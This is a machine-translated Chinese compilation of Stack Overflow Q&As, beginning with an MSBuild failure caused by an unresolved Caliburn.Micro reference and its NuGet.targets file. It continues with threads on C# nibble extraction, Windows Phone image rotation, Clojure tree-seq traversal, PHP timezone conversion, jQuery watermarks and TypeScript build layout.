          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Windows.Interactivity.exe", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\Program Files\Microsoft SQL Server\100\DTS\ForEachEnumerators\System.Windows.Interactivity.exe", but it didn't exist.
          For SearchPath "{GAC}".
          Considered "System.Windows.Interactivity", which was not found in the GAC.
          For SearchPath "{RawFileName}".
          Considered treating "System.Windows.Interactivity" as a file name, but it didn't exist.
          For SearchPath "C:\a\bin\".
          Considered "C:\a\bin\System.Windows.Interactivity.winmd", but it didn't exist.
          Considered "C:\a\bin\System.Windows.Interactivity.dll", but it didn't exist.
          Considered "C:\a\bin\System.Windows.Interactivity.exe", but it didn't exist.
  AssemblyFoldersEx location: "{Registry:Software\Microsoft\.NETFramework,v4.0,AssemblyFoldersEx}"
          C:\Program Files (x86)\Microsoft XNA\XNA Game Studio\v4.0\References\Windows\x86\
          C:\Program Files\Reference Assemblies\Microsoft\Workflow Manager\1.0\

          C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-10\ref\Caching\

          C:\Program Files\Windows Azure SDK\v1.6\ServiceBus\ref\
          C:\Program Files\Windows Azure SDK\v1.6\Cache\ref\
          C:\Program Files (x86)\Microsoft WCF Data Services\5.0\bin\.NETFramework\
          C:\Program Files (x86)\Common Files\microsoft shared\VSTT\10.0\UITestExtensionPackages
          C:\Program Files\Reference Assemblies\Microsoft\VSTO40\v4.0.Framework\
          C:\Program Files\Reference Assemblies\Microsoft\VSTA30\v9.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTA30\v8.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTA30\v10.0\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Visual Studio Tools for Office\PIA\Office15\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Visual Studio Tools for Office\PIA\Office14\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Visual Studio Tools for Office\PIA\Common\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Office14\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Office12\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Common\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\Extensions\Microsoft\SharePoint\PublicAssemblies\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\ReferenceAssemblies\v4.0\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\ReferenceAssemblies\v4.0\
          C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Platforms\x64\
          C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Platforms\Win32\
          C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Platforms\Itanium\
          C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\V110\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\VBPowerPacks\v10.0\
          C:\Program Files (x86)\Microsoft Synchronization Services\ADO.NET\v1.0
          C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v3.5\Desktop

          C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\WorkflowActivities\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\SharePoint15\
          C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\ISAPI\
          C:\Program Files (x86)\Microsoft SDKs\RIA Services\v1.0\Libraries\Server\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\ReportViewer\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\PublicAssemblies\
          C:\Program Files (x86)\Microsoft.NET\Primary Interop Assemblies\
          C:\Program Files (x86)\Open XML SDK\V2.5\lib
          C:\Program Files (x86)\Reference Assemblies\Microsoft\FSharp\2.0\Runtime\v4.0\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\FSharp\3.0\Runtime\v4.0\Type Providers\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\FSharp\3.0\Runtime\v4.0\
          C:\Program Files (x86)\Microsoft SDKs\Expression\Extensions\FXG\Libraries\.NETFramework\v4.0\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\VSTSDB\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v2.0\Assemblies\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v1.0\Assemblies\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 4\Assemblies\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 3\Assemblies\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\Windows Identity Foundation SDK\v4.0\
          C:\Program Files\Reference Assemblies\Microsoft\Windows Identity Foundation\v3.5\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\ReportViewer\
          C:\Program Files\Reference Assemblies\Microsoft\Microsoft Identity Extensions\1.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTO40\v9.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTO40\v10.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTA30\v9.0\
          C:\Program Files\Reference Assemblies\Microsoft\VSTA30\v10.0\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Office14\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Office12\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Visual Studio Tools for Office\PIA\Common\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\Extensions\Microsoft\SharePoint\PublicAssemblies\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\VSSDK\VisualStudioIntegration\Common\Assemblies\v2.0\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\ReferenceAssemblies\v2.0\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\ReferenceAssemblies\v2.0\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\VBPowerPacks\v10.0\
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\ReferenceAssemblies\v2.0\
          C:\Program Files (x86)\Microsoft Synchronization Services\ADO.NET\v1.0
          C:\Program Files (x86)\Microsoft SDKs\Microsoft Sync Framework\v1.0\Runtime\ADO.NET\V2.0\x64\
          C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop
          C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v3.5\Desktop
          C:\Program Files (x86)\Reference Assemblies\Microsoft\SharePoint14\
          C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-10\ref
          C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-06\ref
          C:\Program Files\Windows Azure SDK\v1.6\ref
          C:\Program Files (x86)\Microsoft Visual Studio 10.0\ReportViewer\
          C:\Program Files (x86)\Common Files\Microsoft Shared\MSEnv\PublicAssemblies\
          C:\Program Files (x86)\Microsoft Chart Controls\Assemblies
          C:\Program Files (x86)\Reference Assemblies\Microsoft\FSharp\2.0\Runtime\v2.0\
          C:\Program Files (x86)\Microsoft SDKs\Microsoft Sync Framework\v1.0\Runtime\x86\
          C:\Program Files (x86)\Reference Assemblies\Microsoft\FSharp\3.0\Runtime\v2.0\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Blend\
          C:\Program Files (x86)\Microsoft Visual Studio 11.0\Blend\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 2\Assemblies\
          C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 1.0\Assemblies\
          C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-10\ref
          C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-06\ref
          C:\Program Files\Windows Azure SDK\v1.6\ref
C:\a\src\VpUserControls\Views\Navigation\DimensionTreeView.xaml(13,26): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 13 Position 26\. [C:\a\src\VpUserControls\VpUserControls.csproj]
C:\a\src\VpUserControls\Views\Navigation\NavigationBarView.xaml(13,33): error MC3072: The property 'View.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 13 Position 33\. [C:\a\src\VpUserControls\VpUserControls.csproj]
C:\a\src\VpUserControls\Views\Tools\ToolBarView.xaml(22,28): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 22 Position 28\. [C:\a\src\VpUserControls\VpUserControls.csproj]
C:\a\src\VpUserControls\Views\Workspace\DimensionBarsView.xaml(11,19): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 11 Position 19\. [C:\a\src\VpUserControls\VpUserControls.csproj]
Done Building Project "C:\a\src\VpUserControls\VpUserControls.csproj" (default targets) -- FAILED.
Done Building Project "C:\a\src\VP\VP.csproj" (default targets) -- FAILED.
Done Building Project "C:\a\src\ValuePlan.Client.sln" (default targets) -- FAILED.

Build FAILED.

"C:\a\src\ValuePlan.Client.sln" (default target) (1) ->
"C:\a\src\VP\VP.csproj" (default target) (2) ->
"C:\a\src\VpUserControls\VpUserControls.csproj" (default target) (3) ->
(ResolveAssemblyReferences target) -> 
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "Caliburn.Micro". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\a\src\VpUserControls\VpUserControls.csproj]
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "System.Windows.Interactivity". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\a\src\VpUserControls\VpUserControls.csproj]

"C:\a\src\ValuePlan.Client.sln" (default target) (1) ->
"C:\a\src\VP\VP.csproj" (default target) (2) ->
"C:\a\src\VpUserControls\VpUserControls.csproj" (default target) (3) ->
(MarkupCompilePass1 target) -> 
  C:\a\src\VpUserControls\Views\Navigation\DimensionTreeView.xaml(13,26): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 13 Position 26\. [C:\a\src\VpUserControls\VpUserControls.csproj]
  C:\a\src\VpUserControls\Views\Navigation\NavigationBarView.xaml(13,33): error MC3072: The property 'View.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 13 Position 33\. [C:\a\src\VpUserControls\VpUserControls.csproj]
  C:\a\src\VpUserControls\Views\Tools\ToolBarView.xaml(22,28): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 22 Position 28\. [C:\a\src\VpUserControls\VpUserControls.csproj]
  C:\a\src\VpUserControls\Views\Workspace\DimensionBarsView.xaml(11,19): error MC3072: The property 'Bind.Model' does not exist in XML namespace 'http://www.caliburnproject.org'. Line 11 Position 19\. [C:\a\src\VpUserControls\VpUserControls.csproj]

    2 Warning(s)
    4 Error(s)

Time Elapsed 00:00:18.83 
```

任何人都有类似的问题，或者我读错了日志并误解了这里发生的事情。

* * *

**编辑**

我认为 NuGet.targets 文件可能被错误地设置为托管构建。在该`RestoreCommand`部分中有`-o`一些人报告的这个修饰符不合适。

```
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<PropertyGroup>
    <SolutionDir Condition="$(SolutionDir) == '' Or $(SolutionDir) == '*Undefined*'">$(MSBuildProjectDirectory)\..\</SolutionDir>

    <!-- Enable the restore command to run before builds -->
    <RestorePackages Condition="  '$(RestorePackages)' == '' ">false</RestorePackages>

    <!-- Property that enables building a package from a project -->
    <BuildPackage Condition=" '$(BuildPackage)' == '' ">false</BuildPackage>

    <!-- Download NuGet.exe if it does not already exist -->
    <DownloadNuGetExe Condition=" '$(DownloadNuGetExe)' == '' ">false</DownloadNuGetExe>
</PropertyGroup>

<ItemGroup Condition=" '$(PackageSources)' == '' ">
    <!-- Package sources used to restore packages. By default will used the registered sources under %APPDATA%\NuGet\NuGet.Config -->
    <!--
        <PackageSource Include="https://nuget.org/api/v2/" />
        <PackageSource Include="https://my-nuget-source/nuget/" />
    -->
</ItemGroup>

<PropertyGroup Condition=" '$(OS)' == 'Windows_NT'">
    <!-- Windows specific commands -->
    <NuGetToolsPath>$([System.IO.Path]::Combine($(SolutionDir), ".nuget"))</NuGetToolsPath>
    <PackagesConfig>$([System.IO.Path]::Combine($(ProjectDir), "packages.config"))</PackagesConfig>
    <PackagesDir>$([System.IO.Path]::Combine($(SolutionDir), "packages"))</PackagesDir>
</PropertyGroup>

<PropertyGroup Condition=" '$(OS)' != 'Windows_NT'">
    <!-- We need to launch nuget.exe with the mono command if we're not on windows -->
    <NuGetToolsPath>$(SolutionDir).nuget</NuGetToolsPath>
    <PackagesConfig>packages.config</PackagesConfig>
    <PackagesDir>$(SolutionDir)packages</PackagesDir>
</PropertyGroup>

<PropertyGroup>
    <!-- NuGet command -->
    <NuGetExePath Condition=" '$(NuGetExePath)' == '' ">$(NuGetToolsPath)\nuget.exe</NuGetExePath>
    <PackageSources Condition=" $(PackageSources) == '' ">@(PackageSource)</PackageSources>

    <NuGetCommand Condition=" '$(OS)' == 'Windows_NT'">"$(NuGetExePath)"</NuGetCommand>
    <NuGetCommand Condition=" '$(OS)' != 'Windows_NT' ">mono --runtime=v4.0.30319 $(NuGetExePath)</NuGetCommand>

    <PackageOutputDir Condition="$(PackageOutputDir) == ''">$(TargetDir.Trim('\\'))</PackageOutputDir>

    <!-- Commands -->
    <RestoreCommand>$(NuGetCommand) install "$(PackagesConfig)" -source "$(PackageSources)" -o "$(PackagesDir)"</RestoreCommand>
    <BuildCommand>$(NuGetCommand) pack "$(ProjectPath)" -p Configuration=$(Configuration) -o "$(PackageOutputDir)" -symbols</BuildCommand>

    <!-- Make the build depend on restore packages -->
    <BuildDependsOn Condition="$(RestorePackages) == 'true'">
        RestorePackages;
        $(BuildDependsOn);
    </BuildDependsOn>

    <!-- Make the build depend on restore packages -->
    <BuildDependsOn Condition="$(BuildPackage) == 'true'">
        $(BuildDependsOn);
        BuildPackage;
    </BuildDependsOn>
</PropertyGroup>

<Target Name="CheckPrerequisites">
    <!-- Raise an error if we're unable to locate nuget.exe  -->
    <Error Condition="'$(DownloadNuGetExe)' != 'true' AND !Exists('$(NuGetExePath)')" Text="Unable to locate '$(NuGetExePath)'" />
    <SetEnvironmentVariable EnvKey="VisualStudioVersion" EnvValue="$(VisualStudioVersion)" Condition=" '$(VisualStudioVersion)' != '' AND '$(OS)' == 'Windows_NT' " />
    <DownloadNuGet OutputFilename="$(NuGetExePath)" Condition=" '$(DownloadNuGetExe)' == 'true' AND !Exists('$(NuGetExePath)')"  />
</Target>

<Target Name="RestorePackages" DependsOnTargets="CheckPrerequisites">
    <Exec Command="$(RestoreCommand)"
          Condition="'$(OS)' != 'Windows_NT' And Exists('$(PackagesConfig)')" />

    <Exec Command="$(RestoreCommand)"
          LogStandardErrorAsError="true"
          Condition="'$(OS)' == 'Windows_NT' And Exists('$(PackagesConfig)')" />
</Target>

<Target Name="BuildPackage" DependsOnTargets="CheckPrerequisites">
    <Exec Command="$(BuildCommand)" 
          Condition=" '$(OS)' != 'Windows_NT' " />

    <Exec Command="$(BuildCommand)"
          LogStandardErrorAsError="true"
          Condition=" '$(OS)' == 'Windows_NT' " />
</Target>

<UsingTask TaskName="DownloadNuGet" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup>
        <OutputFilename ParameterType="System.String" Required="true" />
    </ParameterGroup>
    <Task>
        <Reference Include="System.Core" />
        <Using Namespace="System" />
        <Using Namespace="System.IO" />
        <Using Namespace="System.Net" />
        <Using Namespace="Microsoft.Build.Framework" />
        <Using Namespace="Microsoft.Build.Utilities" />
        <Code Type="Fragment" Language="cs">
            <![CDATA[
            try {
                OutputFilename = Path.GetFullPath(OutputFilename);

                Log.LogMessage("Downloading latest version of NuGet.exe...");
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://nuget.org/nuget.exe", OutputFilename);

                return true;
            }
            catch (Exception ex) {
                Log.LogErrorFromException(ex);
                return false;
            }
        ]]>
        </Code>
    </Task>
</UsingTask>

 <UsingTask TaskName="SetEnvironmentVariable" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup>
        <EnvKey ParameterType="System.String" Required="true" />
        <EnvValue ParameterType="System.String" Required="true" />
    </ParameterGroup>
    <Task>
        <Using Namespace="System" />
        <Code Type="Fragment" Language="cs">
            <![CDATA[
            try {
                Environment.SetEnvironmentVariable(EnvKey, EnvValue, System.EnvironmentVariableTarget.Process);
            }
            catch  {
            }
        ]]>
        </Code>
    </Task>
</UsingTask> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-13T11:41:05.660

所以我自己设法解决了这个问题。`NuGet`我的其中一个包 ( )一定有问题，`Caliburn.Micro 1.3.1`因为当我更新该包时，问题就消失了。我猜这个包寻找它自己的程序集的方式有些不正确，但不能确定，因为我不是`NuGet`包如何工作的专家。

如果有人有类似的问题，我建议查看您的软件包，更新它们和/或联系他们的开发人员，询问自动构建是否存在问题。

# c# - 如何从字节中读取前 4 位和后 4 位？

> ID：15899640
> 
> 赞同：9
> 
> 时间：2013-04-09T10:36:28.520
> 
> 标签：c#, byte, bit

C# 如何从字节中读取前 4 位和后 4 位？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-04-09T10:38:05.303

使用按位`AND`和移位，如下所示：

```
byte b = 0xAB;
var low = b & 0x0F;
var high = b >> 4; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-10-09T14:41:52.783

我宁愿简单地使用这个 -

```
byte a = 68;
byte high_bits = a>>4;
byte low_bits = a&15; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-10-24T01:22:56.330

在一个方便的结构中：

### 用法

```
var hb = new HalvedByte(5, 10);
hb.Low -= 3;
hb.High += 3;
Console.Write(string.Format("{0} / {1}", hb.Low, hb.High));
// 2, 13 
```

### 代码

```
public struct HalvedByte
{
    public byte Full { get; set; }

    public byte Low
    {
        get { return (byte)(Full & 0x0F); }

        set
        {
            if (value >= 16)
            {
                throw new ArithmeticException("Value must be between 0 and 16."); 
            }

            Full = (byte)((High << 4) | (value & 0x0F));
        }
    }

    public byte High
    {
        get { return (byte)(Full >> 4); }

        set
        {
            if (value >= 16)
            {
                throw new ArithmeticException("Value must be between 0 and 16.");
            }

            Full = (byte)((value << 4) | Low);
        }
    }

    public HalvedByte(byte full)
    {
        Full = full;
    }

    public HalvedByte(byte low, byte high)
    {
        if (low >= 16 || high >= 16)
        {
            throw new ArithmeticException("Values must be between 0 and 16.");
        }

        Full = (byte)((high << 4) | low);
    }
} 
```

### 奖励：数组（未经测试）

如果您需要使用这些半字节的数组，这将简化访问：

```
public class HalvedByteArray
{
    public int Capacity { get; private set; }
    public HalvedByte[] Array { get; private set; }

    public byte this[int index]
    {
        get
        {
            if (index < 0 || index >= Capacity)
            {
                throw new IndexOutOfRangeException();
            }

            var hb = Array[index / 2];

            return (index % 2 == 0) ? hb.Low : hb.High;
        }
        set
        {
            if (index < 0 || index >= Capacity)
            {
                throw new IndexOutOfRangeException();
            }

            var hb = Array[index / 2];

            if (index % 2 == 0)
            {
                hb.Low = value;
            }
            else
            {
                hb.High = value;
            }
        }
    }

    public HalvedByteArray(int capacity)
    {
        if (capacity < 0)
        {
            throw new ArgumentException("Capacity must be positive.", "capacity");
        }

        Capacity = capacity;
        Array = new HalvedByte[capacity / 2];
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-10-26T09:44:01.160

简单的方法来做到这一点。

示例使用：

答：10101110

乙：00001110

从 A 获取最后 4 位，这样输出就像 B

getBitRange(10101110, 0, 4);

```
//gets a bits from a byte, and return a byte of the new bits
byte getBitRange(byte data, int start, int _end){

//shift binary to starting point of range
byte shifted = (data >> start);

//calculate range length (+1 for 0 index)
int rangeLength = (_end-start)+1;

//get binary mask based on range length 
byte maskBinary;

switch (rangeLength){
case 1: maskBinary = 0b00000001; break;
case 2: maskBinary = 0b00000011; break;
case 3: maskBinary = 0b00000111; break;
case 4: maskBinary = 0b00001111; break;
case 5: maskBinary = 0b00011111; break;
case 6: maskBinary = 0b00111111; break;
case 7: maskBinary = 0b01111111; break;
case 8: maskBinary = 0b11111111; break;
default:
  // default statements
  Serial.println("Error: Range length too long!!");
}

//cancel out 
byte finalByte = (shifted & maskBinary);

return finalByte;
} 
```

# rotation - 如何在没有情节提要的情况下旋转图像？

> ID：15899642
> 
> 赞同：1
> 
> 时间：2013-04-09T10:36:31.547
> 
> 标签：rotation, windows-phone-8

我想在不使用故事板的情况下旋转对象..在故事板中，从属性到属性很容易。但是我想第一次单击旋转那次旋转 90 度，同时单击旋转旋转 180 度，依此类推直到 360 度......只是我希望你每次单击旋转时旋转 90 度...... .
我每次点击旋转按钮时都在这种类型的屏幕上......
![在此处输入图像描述](https://i.stack.imgur.com/zUUKL.png) ![在此处输入图像描述](https://i.stack.imgur.com/PPqce.png) ![在此处输入图像描述](https://i.stack.imgur.com/IYaUa.png) ![在此处输入图像描述](https://i.stack.imgur.com/hng5B.png) ![在此处输入图像描述](https://i.stack.imgur.com/HLayA.png)

请帮我....

提前致谢.....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:46:14.657

使用 RotateTransform：http: [//msdn.microsoft.com/en-us/library/system.windows.media.rotatetransform%28v=vs.95%29.aspx](http://msdn.microsoft.com/en-us/library/system.windows.media.rotatetransform%28v=vs.95%29.aspx)

在您的代码中，您可以像这样使用它：

```
((RotateTransform)YourImageObjectName.RenderTransform).Angle = x; 
```

# clojure - 如何遍历/遍历任意嵌入式结构

> ID：15899652
> 
> 赞同：1
> 
> 时间：2013-04-09T10:37:07.017
> 
> 标签：clojure

我想要一种机制来遍历任意嵌套的数据结构。然后在每个节点上应用 fn，然后检查 fn 在每个点是否返回 true。

使用扁平结构很容易做到这一点 -

```
(walk (complement string?) #(every? true? %) [ 1 2 3 4]) 
```

但是 walk 不适用于嵌套的 -

```
(walk (complement string?) #(every? true? %) [ 1 2 3 [ "a" ]]) 
```

仅使用 flatten 也行不通，因为我将地图作为其中一种形式，并且我也希望将 fn 应用于地图中的每个值。这是我将拥有的结构 -

```
[ ["2012" [{:a 2} {:b 3}]] ["2013" [{:a 2} {:b 3}]] ] 
```

我可以轻松地编写一个 fn 来仅遍历上述内容并将 fn 应用于每个 val。但是有没有办法编写一个通用的遍历机制？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T15:42:01.223

tree-seq 可能是你想要的

```
(every? (complement string?)
        (remove coll?
                (tree-seq coll? #(if (map? %)
                                   (vals %)
                                   %)
                          [["2012" [{:a 2} {:b 3}]] ["2013" [{:a 2} {:b 3}]]])))
;; false

(every? (complement string?)
        (remove coll?
                (tree-seq coll? #(if (map? %)
                                   (vals %)
                                   %)
                          [[2012 [{:a 2} {:b 3}]] [2013 [{:a 2} {:b 3}]]])))
;; true 
```

# php - 如何将“欧洲/柏林”时区的给定日期时间“2013-04-09T14:30:00Z”转换为“美国/东部”时区日期时间

> ID：15899653
> 
> 赞同：0
> 
> 时间：2013-04-09T10:37:07.763
> 
> 标签：php

我有`$given_date='2013-04-09T14:30:00Z'`；

此日期时间来自**欧洲/柏林**时区，我想将此日期时间转换为**美国/东部**时区日期时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:43:05.947

添加以下行以更改默认时区

```
date_default_timezone_set('US/Eastern'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:00:07.453

尝试使用 php [datetime](http://www.php.net/manual/en/book.datetime.php)和[datetimezone](http://php.net/manual/en/class.datetimezone.php)

```
 $given_date='2013-04-09T14:30:00Z';
 $tz     = new DateTimeZone('Europe/Berlin');
 $newTz  = new DateTimeZone('US/Eastern');

 $date = new DateTime($given_date, $tz);
 $date->setTimezone($newTz);
 echo $date->format('Your required Format'); 
```

# jquery - 水印在模糊后重置

> ID：15899655
> 
> 赞同：0
> 
> 时间：2013-04-09T10:37:15.500
> 
> 标签：jquery, watermark

首先，在页面加载时，我将默认水印设置如下：

```
function AddWatermarksDataEntry() {
    initialWatermarks = new Array();
    initialWatermarks.push(new Array("P1_BIRTHDATE_MASK", "__/__/____"));
    initialWatermarks.push(new Array("P2_BIRTHDATE_MASK", "__/__/____"));
    initialWatermarks.push(new Array("P1_VALIDFROM_MASK", "~#SF_DD/MM/YYYY~"));
    initialWatermarks.push(new Array("P2_VALIDFROM_MASK", "~#SF_DD/MM/YYYY~"));
    initialWatermarks.push(new Array("P1_IDENTITYDOCUMENTNUMBER", " "));
    initialWatermarks.push(new Array("P2_IDENTITYDOCUMENTNUMBER", " ")); //***-*******-**
    initialWatermarks.push(new Array("P1_VAT", "~#SF_9OR10_DIGIT~"));
    initialWatermarks.push(new Array("P2_VAT", "~#SF_9OR10_DIGIT~"));
    Watermarker(initialWatermarks);
} 
```

稍后，当我为我的身份证类型调整下拉值时，我会执行以下操作：

```
if(newIdentityDocumentType == "1")
            {
                ChangeIdentityDocumentNumberField($('#'+ whichPerson +'_IDENTITYDOCUMENTNUMBER'), $('#'+ whichPerson +'_NATIONALITY'), watermarkIdentityDocumentNumberBelgian, foreignPersonWaterMark, 14, 14);
                $('#'+ whichPerson +'_IDENTITYDOCUMENTNUMBER').mask('999-9999999-99');
                $('.'+ whichPerson + '.identityDocumentNumber').text('e.g. 123-456789112-34');
            } 
```

我检查用户是否选择了正确的身份证件类型。如果他或她这样做了，则更改输入字段的属性，具体来说，我希望调整水印。

ChangeidentityDocumentField 方法调用将更改水印的方法，如下所示：

```
function ChangeIdentityDocumentNumberField(IdentityDocumentNumberField, NationalityField, WatermarkBelgian, WatermarkForeign, MaximumBelgian, MaximumForeign) {
    if (NationalityField.val() == "0") {
        //omitted code
        ChangeWatermark(IdentityDocumentNumberField, WatermarkBelgian);
    } else {
        //omitted code
        ChangeWatermark(IdentityDocumentNumberField, WatermarkForeign);
    }
}

function Watermarker(newWatermark) {
for (i = 0; i < newWatermark.length; i++) {
    $('#' + newWatermark[i][0]).Watermark(newWatermark[i][1]);

    $('#' + newWatermark[i][0]).blur(function (item, watermark) {
        return function () {
            //if ($('#' + item).val() == '') {
                $('#' + item).Watermark(watermark);

            //};
        };
    } (newWatermark[i][0], newWatermark[i][1]));
}; 
```

}

有了这个方法，问题就来了，当我在一个输入框想出去的时候，调用上面的函数，一切顺利，我看到添加了水印（我在调试的时候，但是，突然，当代码跳转到：

```
} (newWatermark[i][0], newWatermark[i][1])); 
```

我的水印被重置为默认值！？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-03T18:48:32.840

我已经通过删除上面的代码并用占位符替换它来解决这个问题。但是我遇到了一个新问题： [Change placeholder text with jquery also auto-update in IE](https://stackoverflow.com/questions/16903620/change-placeholder-text-with-jquery-also-auto-update-in-ie)

# javascript - 从 Typescript 编译中排除引用？

> ID：15899671
> 
> 赞同：3
> 
> 时间：2013-04-09T10:37:47.360
> 
> 标签：javascript, reference, typescript, build-script

我有一个奇怪的（但在我看来是明智的）场景。

我有一个网站、移动应用程序，也许还有一个用 Javascript 编写的网络服务器。我有大量的功能在所有这些系统之间共享。这种共享的东西将是模型、存储库、业务逻辑等。

如果我们排除 Web 服务器位，因为这是一个未来的想法，Web 应用程序的目录结构如下：

```
app
|- assets
|- models
|- services
|- migrations
|- view-models
|- views
|- descriptors 
```

现在，这些应用程序中的每一个都分为 2 个区域，核心和 ui 部分，核心是可重用的东西，例如，`models, services, migrations`ui 的东西仅用于包含以下内容的应用程序`view-models, descriptors`（以防你想知道视图都是html 和资产是 css、图像等）。

在我采用 typescript 之前，我有一个构建脚本，它基本上将所有核心文件组合在一起并缩小它们。然后它将所有 UI 组合在一起并缩小它们。这样在移动应用程序中我就可以使用`my-app.core.min.js`并且每个人都很高兴，我正在重用主 Web 应用程序中的所有可重用组件。但是我不需要 ui 的东西，因为移动 UI 与主要的 web ui 完全不同，而且 web 服务甚至不会有 UI。

## 所以！

解释完上下文后，让我们回到手头的 Typescript 问题。目前，打字稿文件是由`tsc.exe`（0.83 版）通过构建脚本编译的，它只是包装了交互。

因此，在新的 Typescript 世界中，该结构现在有一个引用文件夹，如下所示：

```
app
|- assets
|- models
|- services
|- migrations
|- view-models
|- views
|- descriptors
|- references <- NEW ONE! 
```

该`references`文件夹由包含所有本地引用的构建脚本自动填充，因此它将遍历整个目录树查找所有打字稿文件并构建一个巨大的参考文件，这是一个充满本地打字稿文件引用声明的文件，以查找更多关于我在看这个问题的信息：

[你能创建 Typescript 包吗？像 c# dll](https://stackoverflow.com/questions/15664032/can-you-create-typescript-packages-like-c-sharp-dlls)

所以现在当我运行构建脚本时，会发生以下步骤：

* * *

**为核心编译**

